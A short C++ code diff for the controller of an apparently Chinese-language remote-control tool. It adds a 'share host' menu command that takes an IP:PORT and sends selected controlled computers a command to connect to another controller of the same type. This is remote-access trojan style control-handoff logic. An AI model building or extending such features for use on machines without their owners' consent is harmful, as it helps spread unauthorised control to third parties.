@@ -20,6 +20,7 @@
 #include "VideoDlg.h"
 #include <vector>
 #include "KeyBoardDlg.h"
+#include "InputDlg.h"
 
 #ifdef _DEBUG
 #define new DEBUG_NEW
@@ -128,6 +129,7 @@ CMy2015RemoteDlg::CMy2015RemoteDlg(IOCPServer* iocpServer, CWnd* pParent): CDial
 	m_bmOnline[0].LoadBitmap(IDB_BITMAP_ONLINE);
 	m_bmOnline[1].LoadBitmap(IDB_BITMAP_UPDATE);
 	m_bmOnline[2].LoadBitmap(IDB_BITMAP_DELETE);
+	m_bmOnline[3].LoadBitmap(IDB_BITMAP_SHARE);
 
 	InitializeCriticalSection(&m_cs);
 }
@@ -191,6 +193,7 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
 	ON_MESSAGE(WM_HANDLEMESSAGE, OnHandleMessage)
 	ON_MESSAGE(WM_OPENKEYBOARDDIALOG, OnOpenKeyboardDialog)
 	ON_WM_HELPINFO()
+	ON_COMMAND(ID_ONLINE_SHARE, &CMy2015RemoteDlg::OnOnlineShare)
 END_MESSAGE_MAP()
 
 
@@ -741,6 +744,7 @@ void CMy2015RemoteDlg::OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult)
 	Menu.SetMenuItemBitmaps(ID_ONLINE_MESSAGE, MF_BYCOMMAND, &m_bmOnline[0], &m_bmOnline[0]);
 	Menu.SetMenuItemBitmaps(ID_ONLINE_UPDATE, MF_BYCOMMAND, &m_bmOnline[1], &m_bmOnline[1]);
 	Menu.SetMenuItemBitmaps(ID_ONLINE_DELETE, MF_BYCOMMAND, &m_bmOnline[2], &m_bmOnline[2]);
+	Menu.SetMenuItemBitmaps(ID_ONLINE_SHARE, MF_BYCOMMAND, &m_bmOnline[3], &m_bmOnline[3]);
 	SubMenu->TrackPopupMenu(TPM_LEFTALIGN, Point.x, Point.y, this);
 
 	*pResult = 0;
@@ -1616,4 +1620,25 @@ BOOL CMy2015RemoteDlg::PreTranslateMessage(MSG* pMsg)
 	}
 
 	return CDialogEx::PreTranslateMessage(pMsg);
+}
+
+
+void CMy2015RemoteDlg::OnOnlineShare()
+{
+	CInputDialog dlg(this);
+	dlg.Init("分享主机", "输入<IP:PORT>地址:");
+	if (dlg.DoModal() != IDOK || dlg.m_str.IsEmpty())
+		return;
+	if (dlg.m_str.GetLength() >= 250) {
+		MessageBox("字符串长度超出[0, 250]范围限制!", "提示", MB_ICONINFORMATION);
+		return;
+	}
+	if (IDYES != MessageBox(_T("确定分享选定的被控计算机吗?\n目前只能分享给同类主控程序。"), _T("提示"), MB_ICONQUESTION | MB_YESNO))
+		return;
+
+	BYTE bToken[_MAX_PATH] = { COMMAND_SHARE };
+	// 目标主机类型
+	bToken[1] = SHARE_TYPE_YAMA;
+	memcpy(bToken + 2, dlg.m_str, dlg.m_str.GetLength());
+	SendSelectedCommand(bToken, sizeof(bToken));
 }
